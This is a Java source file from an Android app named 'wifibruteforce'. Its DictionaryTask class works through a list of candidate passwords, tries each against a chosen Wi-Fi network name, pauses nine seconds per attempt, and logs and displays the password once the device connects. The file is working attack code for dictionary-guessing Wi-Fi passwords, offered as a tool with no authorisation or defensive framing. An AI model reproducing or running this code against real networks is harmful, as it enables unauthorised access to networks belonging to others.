package com.nguyen.wifibruteforce;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.FragmentManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import com.codekidlabs.storagechooser.StorageChooser;

import java.util.ArrayList;

import static android.content.Context.WIFI_SERVICE;

public class DictionaryTask extends AsyncTask<String, Integer, Integer> {
    private Activity activity;
    private String foundPass;
    private ArrayList<String> arrPass;

    public ArrayList<String> getArrPass() {
        return arrPass;
    }

    public void setArrPass(ArrayList<String> arrPass) {
        this.arrPass = arrPass;
    }

    public DictionaryTask(Activity activity) {
        this.activity = activity;

    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();

    }

    @Override
    protected Integer doInBackground(String... strings) {
//        ArrayList test
//        String[] test = {"88888888", "123456789", "222222", "444444444", "12345679", "deophaihoi", "thecoffeehouse"};
//        String testPass;
        int count = 1;
        for (String testPass: getArrPass()) {
//            testPass = test[i];
            Utils.finallyConnect(testPass, strings[0], activity);
            Log.d("pz", testPass);
            publishProgress(count);


            if (isCancelled()) {
                Log.d("pz", "isCancelled");
                break;
            }
            try {
                Thread.sleep(9000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            WifiManager wifi = (WifiManager) activity.getApplicationContext().getSystemService(WIFI_SERVICE);
            WifiInfo wifiInfo = wifi.getConnectionInfo();
            if (Utils.isConnectAccessPoint(activity.getApplicationContext())
                    && Utils.convertSSID(wifiInfo.getSSID()).equals(strings[0])) {
                Log.d("pz", Utils.convertSSID(wifiInfo.getSSID()) + "/" + strings[0] + " /pass: " + testPass);
                Log.d("pz", "pass is: " + testPass);
                foundPass = testPass;
                break;
            }

            count+=1;
        }

        return null;
    }

    @Override
    protected void onProgressUpdate(Integer... values) {
        super.onProgressUpdate(values);
        TextView txtPassCout = activity.findViewById(R.id.txtPassCount);
        txtPassCout.setText(values[0] + "");
    }

    @Override
    protected void onPostExecute(Integer integer) {
        super.onPostExecute(integer);
        Toast.makeText(activity.getApplicationContext(), activity.getString(R.string.pass_found) + foundPass, Toast.LENGTH_LONG).show();
        activity.finish();
    }
}
